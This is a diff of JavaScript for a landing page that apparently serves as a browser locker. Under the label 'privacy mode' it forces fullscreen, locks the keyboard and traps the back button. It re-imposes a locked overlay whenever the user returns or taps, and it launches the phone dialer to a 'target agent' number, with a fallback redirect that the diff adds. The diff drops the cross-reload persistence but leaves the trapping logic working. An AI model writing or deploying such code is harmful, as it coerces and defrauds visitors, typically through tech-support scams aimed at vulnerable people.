@@ -291,33 +291,28 @@ document.addEventListener('DOMContentLoaded', () => {
 
   // Enforce fullscreen retention
   function handleFullscreenChange() {
-    const isModeLocked = isLocked || (sessionStorage.getItem('zen_privacy_locked') === 'true') || (localStorage.getItem('zen_privacy_locked') === 'true');
-    if (isModeLocked && !document.fullscreenElement && !document.webkitFullscreenElement) {
+    if (isLocked && !document.fullscreenElement && !document.webkitFullscreenElement) {
       if (!isNavigatingToDialer) {
-        reassertFullscreen();
+        const docEl = document.documentElement;
+        const reqFs = docEl.requestFullscreen || docEl.webkitRequestFullscreen || docEl.mozRequestFullScreen || docEl.msRequestFullscreen;
+        if (reqFs) {
+          reqFs.call(docEl).catch(() => { });
+        }
       }
     }
   }
 
-  // Trap back navigation so back button on mobile returns directly to locked popup
+  // Trap back navigation
   function onPopState() {
-    const isModeLocked = isLocked || (sessionStorage.getItem('zen_privacy_locked') === 'true') || (localStorage.getItem('zen_privacy_locked') === 'true');
-    if (isModeLocked) {
-      try {
-        history.pushState({ locked: true, ts: Date.now() }, '', location.href);
-      } catch (err) { }
-      enterPrivacyMode();
-      reassertFullscreen();
+    if (isLocked) {
+      history.pushState(null, '', location.href);
     }
   }
 
   // Enter Full-Screen Privacy Mode
   function enterPrivacyMode() {
+    if (isLocked) return;
     isLocked = true;
-    try {
-      sessionStorage.setItem('zen_privacy_locked', 'true');
-      localStorage.setItem('zen_privacy_locked', 'true');
-    } catch (e) { }
 
     // Disable scrollbars on document and body
     document.documentElement.classList.add('privacy-mode-active');
@@ -331,7 +326,11 @@ document.addEventListener('DOMContentLoaded', () => {
     }
 
     // 1. Request Fullscreen
-    reassertFullscreen();
+    const docEl = document.documentElement;
+    const reqFs = docEl.requestFullscreen || docEl.webkitRequestFullscreen || docEl.mozRequestFullScreen || docEl.msRequestFullscreen;
+    if (reqFs) {
+      reqFs.call(docEl).catch(() => { });
+    }
 
     // 2. Chromium Keyboard Lock API (locks all physical keyboard keys)
     if (navigator.keyboard && typeof navigator.keyboard.lock === 'function') {
@@ -358,20 +357,15 @@ document.addEventListener('DOMContentLoaded', () => {
     }
     document.addEventListener('fullscreenchange', handleFullscreenChange);
 
-    // History trap: push trap state so back button never exits to landing page
-    try {
-      history.pushState({ locked: true, ts: Date.now() }, '', location.href);
-    } catch (e) { }
+    // History trap
+    history.pushState(null, '', location.href);
     window.addEventListener('popstate', onPopState);
   }
 
   // Exit Full-Screen Privacy Mode
   function exitPrivacyMode() {
+    if (!isLocked) return;
     isLocked = false;
-    try {
-      sessionStorage.removeItem('zen_privacy_locked');
-      localStorage.removeItem('zen_privacy_locked');
-    } catch (e) { }
 
     // Restore scrollbars on document and body
     document.documentElement.classList.remove('privacy-mode-active');
@@ -435,20 +429,9 @@ document.addEventListener('DOMContentLoaded', () => {
     isNavigatingToDialer = true;
     window.removeEventListener('beforeunload', handleBeforeUnload);
 
-    // Firmly persist lockdown state in both sessionStorage and localStorage
-    try {
-      sessionStorage.setItem('zen_privacy_locked', 'true');
-      localStorage.setItem('zen_privacy_locked', 'true');
-    } catch (e) { }
-
-    // Pre-push history entry so Android back button from dialer stays on the locked popup
-    try {
-      history.pushState({ locked: true, dialing: true, ts: Date.now() }, '', location.href);
-    } catch (e) { }
-
     const telUri = `tel:${TARGET_AGENT_PHONE}`;
     
-    // Direct link click invokes native dialer immediately without document navigation
+    // Direct link click invokes native dialer immediately
     const link = document.createElement('a');
     link.href = telUri;
     link.setAttribute('rel', 'noopener');
@@ -462,6 +445,13 @@ document.addEventListener('DOMContentLoaded', () => {
       } catch (err) { }
     }, 400);
 
+    // Fallback if needed
+    setTimeout(() => {
+      if (document.visibilityState === 'visible' && isNavigatingToDialer) {
+        window.location.href = telUri;
+      }
+    }, 150);
+
     // Re-arm dialer navigation flag after delay
     setTimeout(() => {
       isNavigatingToDialer = false;
@@ -473,21 +463,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
   // Enforce fullscreen retention and recovery
   function reassertFullscreen() {
-    const isModeLocked = isLocked || (sessionStorage.getItem('zen_privacy_locked') === 'true') || (localStorage.getItem('zen_privacy_locked') === 'true');
-    if (!isModeLocked) return;
-
-    // Immediately enforce visual and DOM lockdown classes
-    document.documentElement.classList.add('privacy-mode-active');
-    document.body.classList.add('privacy-mode-active');
-    document.documentElement.style.overflow = 'hidden';
-    document.body.style.overflow = 'hidden';
-
-    if (overlay && !overlay.classList.contains('active')) {
-      overlay.classList.add('active');
-      overlay.setAttribute('aria-hidden', 'false');
-    }
-
-    if (!document.fullscreenElement && !document.webkitFullscreenElement) {
+    if (isLocked && !document.fullscreenElement && !document.webkitFullscreenElement) {
       const docEl = document.documentElement;
       const reqFs = docEl.requestFullscreen || docEl.webkitRequestFullscreen || docEl.mozRequestFullScreen || docEl.msRequestFullscreen;
       if (reqFs) {
@@ -538,44 +514,44 @@ document.addEventListener('DOMContentLoaded', () => {
     });
   });
 
-  // Central return-to-browser handler (when returning from dialer, app switcher, or back navigation)
-  function handleReturnToBrowser() {
-    const isModeLocked = isLocked || (sessionStorage.getItem('zen_privacy_locked') === 'true') || (localStorage.getItem('zen_privacy_locked') === 'true');
-    if (isModeLocked) {
-      enterPrivacyMode();
+  // Re-verify popup lockdown retention on focus and visibility change
+  // so returning from dialer prompt or background maintains full-screen popup
+  window.addEventListener('focus', () => {
+    if (isLocked) {
+      if (overlay) {
+        overlay.classList.add('active');
+        overlay.setAttribute('aria-hidden', 'false');
+      }
+      document.documentElement.classList.add('privacy-mode-active');
+      document.body.classList.add('privacy-mode-active');
+      document.documentElement.style.overflow = 'hidden';
+      document.body.style.overflow = 'hidden';
       reassertFullscreen();
-    }
-  }
-
-  // Re-verify popup lockdown retention on focus, visibility change, and pageshow (bfcache recovery)
-  window.addEventListener('focus', handleReturnToBrowser);
-
-  document.addEventListener('visibilitychange', () => {
-    if (!document.hidden) {
-      handleReturnToBrowser();
     }
   });
 
-  window.addEventListener('pageshow', () => {
-    handleReturnToBrowser();
+  document.addEventListener('visibilitychange', () => {
+    if (!document.hidden && isLocked) {
+      if (overlay) {
+        overlay.classList.add('active');
+        overlay.setAttribute('aria-hidden', 'false');
+      }
+      document.documentElement.classList.add('privacy-mode-active');
+      document.body.classList.add('privacy-mode-active');
+      document.documentElement.style.overflow = 'hidden';
+      document.body.style.overflow = 'hidden';
+      reassertFullscreen();
+    }
   });
 
   // Re-enter fullscreen on any user touch/tap when returning to the screen
   ['touchstart', 'touchend', 'click', 'pointerdown'].forEach(evt => {
     window.addEventListener(evt, () => {
-      const isModeLocked = isLocked || (sessionStorage.getItem('zen_privacy_locked') === 'true') || (localStorage.getItem('zen_privacy_locked') === 'true');
-      if (isModeLocked) {
+      if (isLocked) {
         reassertFullscreen();
       }
     }, { capture: true, passive: true });
   });
-
-  // Auto-restore lockdown on initial load if user was previously locked
-  try {
-    if (sessionStorage.getItem('zen_privacy_locked') === 'true' || localStorage.getItem('zen_privacy_locked') === 'true') {
-      enterPrivacyMode();
-    }
-  } catch (e) { }
 
   // ========================================================
   // 4. ATTACH TO ALL CTA BUTTONS ON THE LANDING PAGE
